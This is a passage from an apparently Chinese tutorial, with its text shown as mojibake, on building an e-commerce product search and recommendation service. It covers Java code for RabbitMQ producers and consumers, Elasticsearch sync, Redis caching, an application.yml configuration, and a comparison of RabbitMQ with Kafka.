        List&lt;UserBehaviorEvent&gt; dbBehaviors = loadUserBehaviorsFromDB(userId);
        
        <span class="hljs-comment">// ç¼“å­˜åˆ°Redisï¼Œæœ‰æ•ˆæœŸ1å°æ—¶</span>
        redisTemplate.opsForValue().set(cacheKey, dbBehaviors, Duration.ofHours(<span class="hljs-number">1</span>));
        <span class="hljs-keyword">return</span> dbBehaviors;
    }

    <span class="hljs-comment">// å…¶ä»–æ ¸å¿ƒæ–¹æ³•ï¼ˆååŒè¿‡æ»¤ã€å†…å®¹æ¨èã€ç»“æœæ··åˆç­‰ï¼Œç•¥ï¼ŒåŒå‰æ–‡Kafkaæ–¹æ¡ˆï¼‰</span>
}
</code></pre>
<h4 data-id="heading-17">5. RabbitMQ æ¶ˆæ¯ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…å®ç°</h4>
<h5 data-id="heading-18">5.1 æ¶ˆæ¯ç”Ÿäº§è€…ï¼ˆå•†å“æœåŠ¡ã€ç”¨æˆ·è¡Œä¸ºé‡‡é›†æœåŠ¡ï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å•†å“å˜æ›´äº‹ä»¶ç”Ÿäº§è€…</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductEventProducer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;

    <span class="hljs-comment">/**
     * å‘é€å•†å“å˜æ›´äº‹ä»¶åˆ°RabbitMQ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendProductChangeEvent</span><span class="hljs-params">(ProductChangeEvent event)</span> {
        <span class="hljs-keyword">try</span> {
            rabbitTemplate.convertAndSend(
                    RabbitMQConfig.PRODUCT_EXCHANGE,
                    <span class="hljs-string">"product.sync"</span>, <span class="hljs-comment">// è·¯ç”±é”®</span>
                    event,
                    correlationData -&gt; {
                        <span class="hljs-comment">// è®¾ç½®æ¶ˆæ¯IDï¼Œç”¨äºç¡®è®¤æœºåˆ¶</span>
                        correlationData.getId();
                        <span class="hljs-keyword">return</span> correlationData;
                    }
            );
            log.info(<span class="hljs-string">"å•†å“å˜æ›´äº‹ä»¶å‘é€æˆåŠŸï¼ŒproductId: {}, eventType: {}"</span>,
                    event.getProductId(), event.getEventType());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"å•†å“å˜æ›´äº‹ä»¶å‘é€å¤±è´¥ï¼ŒproductId: {}"</span>, event.getProductId(), e);
            <span class="hljs-comment">// å¤±è´¥æ—¶å¯æœ¬åœ°æŒä¹…åŒ–ï¼Œåç»­é‡è¯•</span>
        }
    }
}

<span class="hljs-comment">// ç”¨æˆ·è¡Œä¸ºäº‹ä»¶ç”Ÿäº§è€…</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBehaviorProducer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;

    <span class="hljs-comment">/**
     * å‘é€ç”¨æˆ·è¡Œä¸ºäº‹ä»¶åˆ°RabbitMQ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendUserBehaviorEvent</span><span class="hljs-params">(UserBehaviorEvent event)</span> {
        <span class="hljs-keyword">try</span> {
            rabbitTemplate.convertAndSend(
                    RabbitMQConfig.PRODUCT_EXCHANGE,
                    <span class="hljs-string">"user.behavior"</span>, <span class="hljs-comment">// è·¯ç”±é”®</span>
                    event
            );
            log.info(<span class="hljs-string">"ç”¨æˆ·è¡Œä¸ºäº‹ä»¶å‘é€æˆåŠŸï¼ŒuserId: {}, behaviorType: {}"</span>,
                    event.getUserId(), event.getBehaviorType());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"ç”¨æˆ·è¡Œä¸ºäº‹ä»¶å‘é€å¤±è´¥ï¼ŒuserId: {}"</span>, event.getUserId(), e);
        }
    }
}
</code></pre>
<h5 data-id="heading-19">5.2 æ¶ˆæ¯æ¶ˆè´¹è€…ï¼ˆæ ¸å¿ƒæ•°æ®åŒæ­¥é€»è¾‘ï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ESåŒæ­¥æ¶ˆè´¹ç«¯ï¼šæ¶ˆè´¹å•†å“å˜æ›´äº‹ä»¶ï¼ŒåŒæ­¥è‡³Elasticsearch</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductSyncConsumer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-comment">/**
     * æ¶ˆè´¹å•†å“åŒæ­¥é˜Ÿåˆ—æ¶ˆæ¯
     */</span>
    <span class="hljs-meta">@RabbitListener(queues = RabbitMQConfig.PRODUCT_SYNC_QUEUE)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumeProductSyncEvent</span><span class="hljs-params">(ProductChangeEvent event)</span> {
        log.info(<span class="hljs-string">"æ”¶åˆ°å•†å“åŒæ­¥äº‹ä»¶ï¼ŒproductId: {}, eventType: {}"</span>,
                event.getProductId(), event.getEventType());

        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">switch</span> (event.getEventType()) {
                <span class="hljs-keyword">case</span> CREATE:
                <span class="hljs-keyword">case</span> UPDATE:
                    <span class="hljs-comment">// åŒæ­¥å•†å“åˆ°ES</span>
                    syncProductToES(event.getProduct());
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> DELETE:
                    <span class="hljs-comment">// ä»ESåˆ é™¤å•†å“</span>
                    deleteProductFromES(event.getProductId());
                    <span class="hljs-keyword">break</span>;
            }

            <span class="hljs-comment">// è§¦å‘ç¼“å­˜å¤±æ•ˆï¼ˆä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼‰</span>
            invalidateProductCache(event.getProductId());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"å•†å“åŒæ­¥ESå¤±è´¥ï¼ŒproductId: {}"</span>, event.getProductId(), e);
            <span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸ï¼Œæ¶ˆæ¯å°†è¢«å‘é€åˆ°æ­»ä¿¡é˜Ÿåˆ—</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AmqpRejectAndDontRequeueException</span>(<span class="hljs-string">"å•†å“åŒæ­¥å¤±è´¥ï¼Œè¿›å…¥æ­»ä¿¡é˜Ÿåˆ—"</span>, e);
        }
    }

    <span class="hljs-comment">/**
     * åŒæ­¥å•†å“åˆ°Elasticsearch
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncProductToES</span><span class="hljs-params">(Product product)</span> {
        <span class="hljs-type">ProductDocument</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> convertToProductDocument(product);
        doc.buildSuggest(); <span class="hljs-comment">// æ„å»ºæœç´¢å»ºè®®æ•°æ®</span>
        elasticsearchTemplate.save(doc);
        log.info(<span class="hljs-string">"å•†å“åŒæ­¥åˆ°ESæˆåŠŸï¼ŒproductId: {}"</span>, product.getId());
    }

    <span class="hljs-comment">// è¾…åŠ©æ–¹æ³•ï¼šä»ESåˆ é™¤å•†å“ã€ç¼“å­˜å¤±æ•ˆã€DTOè½¬æ¢ï¼ˆç•¥ï¼‰</span>
}

<span class="hljs-comment">// ç”¨æˆ·è¡Œä¸ºæ¶ˆè´¹ç«¯ï¼šæ¶ˆè´¹ç”¨æˆ·è¡Œä¸ºäº‹ä»¶ï¼Œå­˜å‚¨è‡³Redisä¸MySQL</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBehaviorConsumer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserBehaviorMapper userBehaviorMapper;

    <span class="hljs-comment">/**
     * æ¶ˆè´¹ç”¨æˆ·è¡Œä¸ºé˜Ÿåˆ—æ¶ˆæ¯
     */</span>
    <span class="hljs-meta">@RabbitListener(queues = RabbitMQConfig.USER_BEHAVIOR_QUEUE)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumeUserBehaviorEvent</span><span class="hljs-params">(UserBehaviorEvent event)</span> {
        log.info(<span class="hljs-string">"æ”¶åˆ°ç”¨æˆ·è¡Œä¸ºäº‹ä»¶ï¼ŒuserId: {}, productId: {}, behaviorType: {}"</span>,
                event.getUserId(), event.getProductId(), event.getBehaviorType());

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. å­˜å‚¨åˆ°MySQLï¼ˆæŒä¹…åŒ–ï¼‰</span>
            <span class="hljs-type">UserBehaviorPO</span> <span class="hljs-variable">po</span> <span class="hljs-operator">=</span> convertToPO(event);
            userBehaviorMapper.insert(po);

            <span class="hljs-comment">// 2. ç¼“å­˜åˆ°Redisï¼ˆä¾›æ¨èæœåŠ¡ä½¿ç”¨ï¼‰</span>
            updateUserBehaviorCache(event);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"ç”¨æˆ·è¡Œä¸ºå­˜å‚¨å¤±è´¥ï¼ŒuserId: {}"</span>, event.getUserId(), e);
            <span class="hljs-comment">// å¯æ ¹æ®ä¸šåŠ¡éœ€æ±‚å†³å®šæ˜¯å¦é‡è¯•ï¼Œæ­¤å¤„ç›´æ¥ä¸¢å¼ƒï¼ˆæˆ–è¿›å…¥æ­»ä¿¡é˜Ÿåˆ—ï¼‰</span>
        }
    }

    <span class="hljs-comment">/**
     * æ›´æ–°ç”¨æˆ·è¡Œä¸ºRedisç¼“å­˜
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUserBehaviorCache</span><span class="hljs-params">(UserBehaviorEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"user:behaviors:"</span> + event.getUserId();
        List&lt;UserBehaviorEvent&gt; behaviors = (List&lt;UserBehaviorEvent&gt;) redisTemplate.opsForValue().get(cacheKey);
        
        <span class="hljs-keyword">if</span> (behaviors == <span class="hljs-literal">null</span>) {
            behaviors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        }
        
        <span class="hljs-comment">// æ·»åŠ æ–°è¡Œä¸ºï¼Œé™åˆ¶ç¼“å­˜æœ€è¿‘100æ¡</span>
        behaviors.add(event);
        <span class="hljs-keyword">if</span> (behaviors.size() &gt; <span class="hljs-number">100</span>) {
            behaviors = behaviors.subList(behaviors.size() - <span class="hljs-number">100</span>, behaviors.size());
        }
        
        redisTemplate.opsForValue().set(cacheKey, behaviors, Duration.ofHours(<span class="hljs-number">1</span>));
    }

    <span class="hljs-comment">// è¾…åŠ©æ–¹æ³•ï¼šPOè½¬æ¢ï¼ˆç•¥ï¼‰</span>
}

<span class="hljs-comment">// æ­»ä¿¡é˜Ÿåˆ—æ¶ˆè´¹ç«¯ï¼šé‡è¯•å¤±è´¥çš„å•†å“åŒæ­¥æ¶ˆæ¯</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadLetterConsumer</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductSyncConsumer productSyncConsumer;

    <span class="hljs-comment">/**
     * æ¶ˆè´¹æ­»ä¿¡é˜Ÿåˆ—æ¶ˆæ¯ï¼ˆé‡è¯•3æ¬¡åæ”¾å¼ƒï¼‰
     */</span>
    <span class="hljs-meta">@RabbitListener(queues = RabbitMQConfig.DEAD_LETTER_QUEUE)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumeDeadLetterEvent</span><span class="hljs-params">(ProductChangeEvent event, <span class="hljs-meta">@Header(AmqpHeaders.DELIVERY_TAG)</span> <span class="hljs-type">long</span> deliveryTag)</span> {
        log.info(<span class="hljs-string">"æ”¶åˆ°æ­»ä¿¡é˜Ÿåˆ—æ¶ˆæ¯ï¼ŒproductId: {}, eventType: {}"</span>,
                event.getProductId(), event.getEventType());

        <span class="hljs-comment">// è·å–é‡è¯•æ¬¡æ•°ï¼ˆä»æ¶ˆæ¯å±æ€§ä¸­è·å–ï¼‰</span>
        <span class="hljs-type">Integer</span> <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> (Integer) redisTemplate.opsForValue().get(<span class="hljs-string">"retry:count:"</span> + event.getProductId());
        retryCount = retryCount == <span class="hljs-literal">null</span> ? <span class="hljs-number">1</span> : retryCount + <span class="hljs-number">1</span>;

        <span class="hljs-keyword">if</span> (retryCount &lt;= <span class="hljs-number">3</span>) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// é‡è¯•åŒæ­¥é€»è¾‘</span>
                productSyncConsumer.consumeProductSyncEvent(event);
                <span class="hljs-comment">// é‡è¯•æˆåŠŸï¼Œåˆ é™¤é‡è¯•è®¡æ•°</span>
                redisTemplate.delete(<span class="hljs-string">"retry:count:"</span> + event.getProductId());
                log.info(<span class="hljs-string">"æ­»ä¿¡æ¶ˆæ¯é‡è¯•æˆåŠŸï¼ŒproductId: {}, retryCount: {}"</span>, event.getProductId(), retryCount);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-comment">// é‡è¯•å¤±è´¥ï¼Œæ›´æ–°é‡è¯•è®¡æ•°ï¼Œç­‰å¾…ä¸‹æ¬¡é‡è¯•ï¼ˆå¯è®¾ç½®å»¶è¿Ÿï¼‰</span>
                redisTemplate.opsForValue().set(<span class="hljs-string">"retry:count:"</span> + event.getProductId(), retryCount, Duration.ofMinutes(<span class="hljs-number">5</span>));
                log.error(<span class="hljs-string">"æ­»ä¿¡æ¶ˆæ¯é‡è¯•å¤±è´¥ï¼ŒproductId: {}, retryCount: {}"</span>, event.getProductId(), retryCount, e);
                <span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸ï¼Œæ¶ˆæ¯å°†é‡æ–°å…¥é˜Ÿï¼ˆæˆ–æ ¹æ®ç­–ç•¥ä¸¢å¼ƒï¼‰</span>
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AmqpRejectAndDontRequeueException</span>(<span class="hljs-string">"é‡è¯•å¤±è´¥"</span>, e);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// é‡è¯•æ¬¡æ•°è¶…è¿‡3æ¬¡ï¼Œè®°å½•æ—¥å¿—å¹¶ä¸¢å¼ƒ</span>
            log.error(<span class="hljs-string">"æ­»ä¿¡æ¶ˆæ¯é‡è¯•æ¬¡æ•°è€—å°½ï¼ŒproductId: {}, è¯·äººå·¥å¤„ç†"</span>, event.getProductId());
            <span class="hljs-comment">// æ‰‹åŠ¨ç¡®è®¤æ¶ˆæ¯ï¼Œä¸å†é‡è¯•</span>
            <span class="hljs-comment">// channel.basicAck(deliveryTag, false);</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-20">6. ç¼“å­˜ä¼˜åŒ–ç­–ç•¥å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCacheService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ElasticsearchRestTemplate elasticsearchTemplate;

    <span class="hljs-comment">/**
     * è·å–å•†å“è¯¦æƒ…ï¼ˆç¼“å­˜ä¼˜å…ˆï¼‰
     */</span>
    <span class="hljs-keyword">public</span> ProductDTO <span class="hljs-title function_">getProductDetail</span><span class="hljs-params">(String productId)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:detail:"</span> + productId;

        <span class="hljs-comment">// 1. ä»Redisç¼“å­˜è·å–</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">cachedProduct</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (cachedProduct != <span class="hljs-literal">null</span>) {
            log.debug(<span class="hljs-string">"ä»ç¼“å­˜è·å–å•†å“è¯¦æƒ…ï¼ŒproductId: {}"</span>, productId);
            <span class="hljs-keyword">return</span> (ProductDTO) cachedProduct;
        }

        <span class="hljs-comment">// 2. ç¼“å­˜æœªå‘½ä¸­ï¼Œä»ESè·å–</span>
        <span class="hljs-type">ProductDocument</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> elasticsearchTemplate.findById(productId, ProductDocument.class);
        <span class="hljs-keyword">if</span> (doc == <span class="hljs-literal">null</span>) {
            log.warn(<span class="hljs-string">"å•†å“ä¸å­˜åœ¨ï¼ŒproductId: {}"</span>, productId);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }

        <span class="hljs-comment">// 3. è½¬æ¢ä¸ºDTOå¹¶ç¼“å­˜ï¼ˆæœ‰æ•ˆæœŸ30åˆ†é’Ÿï¼‰</span>
        <span class="hljs-type">ProductDTO</span> <span class="hljs-variable">productDTO</span> <span class="hljs-operator">=</span> convertToProductDTO(doc);
        redisTemplate.opsForValue().set(cacheKey, productDTO, Duration.ofMinutes(<span class="hljs-number">30</span>));
        log.debug(<span class="hljs-string">"å•†å“è¯¦æƒ…ç¼“å­˜æˆåŠŸï¼ŒproductId: {}"</span>, productId);

        <span class="hljs-keyword">return</span> productDTO;
    }

    <span class="hljs-comment">/**
     * è·å–çƒ­é—¨å•†å“åˆ—è¡¨ï¼ˆç¼“å­˜+å®šæ—¶æ›´æ–°ï¼‰
     */</span>
    <span class="hljs-keyword">public</span> List&lt;ProductDTO&gt; <span class="hljs-title function_">getHotProducts</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">cacheKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:hot:"</span> + count;

        <span class="hljs-comment">// 1. ä»ç¼“å­˜è·å–</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">cachedHotProducts</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(cacheKey);
        <span class="hljs-keyword">if</span> (cachedHotProducts != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> (List&lt;ProductDTO&gt;) cachedHotProducts;
        }

        <span class="hljs-comment">// 2. ä»ESæŸ¥è¯¢çƒ­é—¨å•†å“ï¼ˆæŒ‰é”€é‡é™åºï¼‰</span>
        <span class="hljs-type">NativeSearchQuery</span> <span class="hljs-variable">searchQuery</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeSearchQueryBuilder</span>()
                .withQuery(QueryBuilders.rangeQuery(<span class="hljs-string">"salesVolume"</span>).gt(<span class="hljs-number">0</span>))
                .withSort(SortBuilders.fieldSort(<span class="hljs-string">"salesVolume"</span>).order(SortOrder.DESC))
                .withPageable(PageRequest.of(<span class="hljs-number">0</span>, count))
                .build();

        SearchHits&lt;ProductDocument&gt; hits = elasticsearchTemplate.search(searchQuery, ProductDocument.class);
        List&lt;ProductDTO&gt; hotProducts = hits.getSearchHits().stream()
                .map(hit -&gt; convertToProductDTO(hit.getContent()))
                .collect(Collectors.toList());

        <span class="hljs-comment">// 3. ç¼“å­˜ç»“æœï¼ˆæœ‰æ•ˆæœŸ10åˆ†é’Ÿï¼Œå®šæ—¶æ›´æ–°ï¼‰</span>
        redisTemplate.opsForValue().set(cacheKey, hotProducts, Duration.ofMinutes(<span class="hljs-number">10</span>));
        log.info(<span class="hljs-string">"çƒ­é—¨å•†å“ç¼“å­˜æˆåŠŸï¼Œcount: {}"</span>, count);

        <span class="hljs-keyword">return</span> hotProducts;
    }

    <span class="hljs-comment">// è¾…åŠ©æ–¹æ³•ï¼šDTOè½¬æ¢ã€ç¼“å­˜é¢„çƒ­ï¼ˆç•¥ï¼‰</span>
}
</code></pre>
<h4 data-id="heading-21">7. æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼ˆapplication.ymlï¼‰</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">product-search-service</span>
  <span class="hljs-comment"># å¾®æœåŠ¡æ³¨å†Œå‘ç°ï¼ˆåŸºäºNacosï¼‰</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">nacos:</span>
      <span class="hljs-attr">discovery:</span>
        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8848</span>
  <span class="hljs-comment"># Elasticsearché…ç½®</span>
  <span class="hljs-attr">data:</span>
    <span class="hljs-attr">elasticsearch:</span>
      <span class="hljs-attr">repositories:</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
      <span class="hljs-attr">client:</span>
        <span class="hljs-attr">reactive:</span>
          <span class="hljs-attr">connection-timeout:</span> <span class="hljs-string">5s</span>
          <span class="hljs-attr">socket-timeout:</span> <span class="hljs-string">60s</span>
      <span class="hljs-attr">uris:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">http://127.0.0.1:9200</span>
  <span class="hljs-comment"># Redisé…ç½®</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
    <span class="hljs-attr">password:</span>
    <span class="hljs-attr">lettuce:</span>
      <span class="hljs-attr">pool:</span>
        <span class="hljs-attr">max-active:</span> <span class="hljs-number">200</span>
        <span class="hljs-attr">max-idle:</span> <span class="hljs-number">50</span>
        <span class="hljs-attr">min-idle:</span> <span class="hljs-number">10</span>
        <span class="hljs-attr">max-wait:</span> <span class="hljs-string">2000ms</span>
  <span class="hljs-comment"># RabbitMQé…ç½®</span>
  <span class="hljs-attr">rabbitmq:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">5672</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">guest</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">guest</span>
    <span class="hljs-attr">virtual-host:</span> <span class="hljs-string">/</span>
    <span class="hljs-comment"># ç”Ÿäº§è€…ç¡®è®¤é…ç½®</span>
    <span class="hljs-attr">publisher-confirm-type:</span> <span class="hljs-string">correlated</span>
    <span class="hljs-attr">publisher-returns:</span> <span class="hljs-literal">true</span>
    <span class="hljs-comment"># æ¶ˆè´¹è€…é…ç½®</span>
    <span class="hljs-attr">listener:</span>
      <span class="hljs-attr">simple:</span>
        <span class="hljs-attr">acknowledge-mode:</span> <span class="hljs-string">auto</span> <span class="hljs-comment"># è‡ªåŠ¨ç¡®è®¤æ¶ˆæ¯</span>
        <span class="hljs-attr">retry:</span>
          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span> <span class="hljs-comment"># å¼€å¯é‡è¯•</span>
          <span class="hljs-attr">max-attempts:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># æœ€å¤§é‡è¯•æ¬¡æ•°</span>
          <span class="hljs-attr">initial-interval:</span> <span class="hljs-string">1000ms</span> <span class="hljs-comment"># åˆå§‹é‡è¯•é—´éš”</span>

<span class="hljs-comment"># Elasticsearchç´¢å¼•ä¼˜åŒ–é…ç½®</span>
<span class="hljs-attr">elasticsearch:</span>
  <span class="hljs-attr">index:</span>
    <span class="hljs-attr">number-of-shards:</span> <span class="hljs-number">3</span> <span class="hljs-comment"># åˆ†ç‰‡æ•°ï¼ˆæ ¹æ®é›†ç¾¤èŠ‚ç‚¹æ•°è°ƒæ•´ï¼‰</span>
    <span class="hljs-attr">number-of-replicas:</span> <span class="hljs-number">1</span> <span class="hljs-comment"># å‰¯æœ¬æ•°ï¼ˆä¿éšœé«˜å¯ç”¨ï¼‰</span>
    <span class="hljs-attr">refresh-interval:</span> <span class="hljs-string">30s</span> <span class="hljs-comment"># ç´¢å¼•åˆ·æ–°é—´éš”ï¼ˆæå‡å†™å…¥æ€§èƒ½ï¼‰</span>

<span class="hljs-comment"># æœåŠ¡ç«¯å£</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8082</span>

<span class="hljs-comment"># æ—¥å¿—é…ç½®</span>
<span class="hljs-attr">logging:</span>
  <span class="hljs-attr">level:</span>
    <span class="hljs-attr">org.springframework.amqp.rabbit.core:</span> <span class="hljs-string">INFO</span>
    <span class="hljs-attr">com.example.search:</span> <span class="hljs-string">INFO</span>
</code></pre>
<h3 data-id="heading-22">å››ã€RabbitMQ æ–¹æ¡ˆæ ¸å¿ƒä¼˜åŠ¿ä¸æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-23">1. ç›¸æ¯” Kafka æ–¹æ¡ˆçš„å·®å¼‚åŒ–ä¼˜åŠ¿</h4>
<ul>
<li><strong>æ¶ˆæ¯å¯é æ€§æ›´é«˜</strong>ï¼šRabbitMQ æ”¯æŒæ¶ˆæ¯ç¡®è®¤ï¼ˆç”Ÿäº§è€…ç¡®è®¤ + æ¶ˆè´¹è€…ç¡®è®¤ï¼‰ã€æ­»ä¿¡é˜Ÿåˆ—ã€æ¶ˆæ¯é‡è¯•ï¼Œé€‚åˆå¯¹æ•°æ®ä¸€è‡´æ€§è¦æ±‚é«˜çš„åœºæ™¯ï¼›</li>
<li><strong>è·¯ç”±æ›´çµæ´»</strong>ï¼šæ”¯æŒ topicã€directã€fanout ç­‰å¤šç§äº¤æ¢æœºç±»å‹ï¼Œå¯æ ¹æ®ä¸šåŠ¡éœ€æ±‚ç²¾å‡†è·¯ç”±æ¶ˆæ¯ï¼›</li>
<li><strong>éƒ¨ç½²ä¸è¿ç»´æ›´è½»é‡</strong>ï¼šå•èŠ‚ç‚¹éƒ¨ç½²å³å¯æ»¡è¶³ä¸­å°è§„æ¨¡ç”µå•†éœ€æ±‚ï¼Œé…ç½®ç®€å•ï¼Œæ•…éšœæ’æŸ¥ä¾¿æ·ï¼›</li>
<li><strong>å»¶è¿Ÿé˜Ÿåˆ—åŸç”Ÿæ”¯æŒ</strong>ï¼šé€šè¿‡æ­»ä¿¡é˜Ÿåˆ— + TTL å¯è½»æ¾å®ç°å»¶è¿Ÿé‡è¯•ï¼Œæ— éœ€é¢å¤–æ’ä»¶ã€‚</li>
</ul>
<h4 data-id="heading-24">2. ç³»ç»Ÿæ ¸å¿ƒä¼˜åŠ¿</h4>
<ul>
<li><strong>é«˜æ€§èƒ½æ£€ç´¢</strong>ï¼šElasticsearch æ¯«ç§’çº§å“åº” + Redis ç¼“å­˜ï¼Œæœç´¢å“åº”æ—¶é—´æ§åˆ¶åœ¨ 100ms ä»¥å†…ï¼›</li>
<li><strong>ç²¾å‡†æœç´¢ä½“éªŒ</strong>ï¼šå¤šå­—æ®µæƒé‡åŒ¹é… + ä¸­æ–‡åˆ†è¯ + æ¨¡ç³Šæœç´¢ï¼Œå¤§å¹…æå‡æœç´¢ç²¾å‡†åº¦ï¼›</li>
<li><strong>ä¸ªæ€§åŒ–æ¨è</strong>ï¼šåŸºäºç”¨æˆ·è¡Œä¸ºçš„ååŒè¿‡æ»¤ + å†…å®¹æ¨èï¼Œæ¨èå‡†ç¡®ç‡æå‡ 30%+ï¼›</li>
<li><strong>å®æ—¶æ•°æ®åŒæ­¥</strong>ï¼šRabbitMQ å¼‚æ­¥é€šä¿¡ï¼Œå•†å“æ•°æ®å˜æ›´åŒæ­¥å»¶è¿Ÿä½äº 1 ç§’ï¼›</li>
<li><strong>ç³»ç»Ÿè§£è€¦ä¸é«˜å¯ç”¨</strong>ï¼šæœåŠ¡é—´é€šè¿‡æ¶ˆæ¯é€šä¿¡ï¼Œæ•…éšœéš”ç¦»ï¼Œå•ä¸ªæœåŠ¡ä¸‹çº¿ä¸å½±å“æ•´ä½“é“¾è·¯ã€‚</li>
</ul>
<h4 data-id="heading-25">3. å…³é”®æ€§èƒ½ä¼˜åŒ–ç‚¹</h4>
<ul>
<li>
<p><strong>RabbitMQ ä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li>åˆç†è®¾ç½®é˜Ÿåˆ—å¹¶å‘æ¶ˆè´¹è€…æ•°é‡ï¼ˆ3-5 ä¸ªï¼‰ï¼Œé¿å…æ¶ˆè´¹ç“¶é¢ˆï¼›</li>
